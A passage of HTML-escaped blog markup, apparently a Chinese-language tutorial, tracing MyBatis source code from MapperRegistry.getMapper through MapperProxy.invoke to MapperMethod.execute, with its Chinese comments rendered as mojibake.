&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;T&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// ç›´æ¥å¾—åˆ°è¯¥ç±»å‹Mapperä»£ç†å·¥å‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MapperProxyFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapperProxyFactory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MapperProxyFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;knownMappers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// æ²¡æœ‰å°±ç¦»è°±
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mapperProxyFactory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BindingException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Type &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34; is not known to the MapperRegistry.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;// é€šè¿‡å½“å‰Sessionç”Ÿäº§ä¸€ä¸ªä»£ç†
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapperProxyFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BindingException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Error getting mapper instance. Cause: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®é™…ä¸Šç”Ÿäº§Mapperçš„é€»è¾‘å¹¶ä¸å¤šã€‚&lt;/p&gt;
&lt;p&gt;ä¸»è¦æ˜¯æ‰§è¡Œä»£ç†æ–¹æ³•æ—¶çš„åŠ¨ä½œã€‚&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œ&lt;code&gt;mapper.selectBlogWithPostsUsingSubSelect(1);&lt;/code&gt;çš„é€»è¾‘å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// ç”±äºæ˜¯ä»£ç†ç”Ÿæˆçš„ï¼Œæ‰€ä»¥è°ƒç”¨æ–¹æ³•åä¼šè¿›å…¥ä¸€ä¸‹é€»è¾‘ï¼š
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nd&#34;&gt;@Override&lt;/span&gt;
  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯æ¥è‡ªObjectï¼Œå°±ç›´æ¥æ‰§è¡Œï¼Œç›´æ¥è¿”å›
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaringClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExceptionUtil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;unwrapThrowable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;c1&#34;&gt;// å»ç¼“å­˜ä¸­æ‰¾MapperMethodï¼Œç¬¬ä¸€æ¬¡çš„è¯ä¼šnewä¸€ä¸ª
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MapperMethod&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapperMethod&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cachedMapperMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//æ‰§è¡Œæœ¬ä½“
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapperMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹é¢å°±æ˜¯æ•´ä¸ªä»£ç†çš„æ‰§è¡Œæ•°æ®åº“æ“ä½œçš„é€»è¾‘ï¼Œæ¯”è¾ƒé•¿ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//å¯ä»¥çœ‹åˆ°æ‰§è¡Œæ—¶å°±æ˜¯4ç§æƒ…å†µï¼Œinsert|update|delete|selectï¼Œåˆ†åˆ«è°ƒç”¨SqlSessionçš„4å¤§ç±»æ–¹æ³•
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlCommandType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;convertArgsToSqlCommandParam&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowCountResult&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlCommandType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;UPDATE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;convertArgsToSqlCommandParam&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowCountResult&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlCommandType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;DELETE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;convertArgsToSqlCommandParam&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowCountResult&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlCommandType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getType&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;// æˆ‘ä»¬æ‰§è¡Œçš„æ˜¯æŸ¥è¯¢ï¼Œç›´æ¥è·³åˆ°è¿™é‡Œ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;returnsVoid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hasResultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// æ£€æŸ¥æ˜¯ä¸æ˜¯æ²¡æœ‰è¿”å›å€¼ä»¥åŠç»“æœå¤„ç†å™¨: æˆ‘ä»¬æ‰§è¡Œçš„æ˜¯æŸ¥è¯¢ï¼Œæ˜¯æœ‰è¿”å›å€¼çš„
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;executeWithResultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;returnsMany&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//å¦‚æœç»“æœæœ‰å¤šæ¡è®°å½•ï¼šæˆ‘ä»¬åªæŸ¥ä¸€æ¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executeForMany&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;returnsMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//å¦‚æœç»“æœæ˜¯mapï¼šæˆ‘ä»¬æŸ¥çš„åªæ˜¯ä¸ªå¯¹è±¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executeForMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//å¦åˆ™å°±æ˜¯ä¸€æ¡è®°å½•
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// æˆ‘ä»¬ä»”ç»†åˆ†æè¿™ä¸ªconvertArgsToSqlCommandParamæ–¹æ³•
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;convertArgsToSqlCommandParam&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// ä¹‹åæˆ‘ä»¬åˆå›åˆ°äº†SelectOneè¿™ä¸ªæ–¹æ³•ã€‚
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;selectOne&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
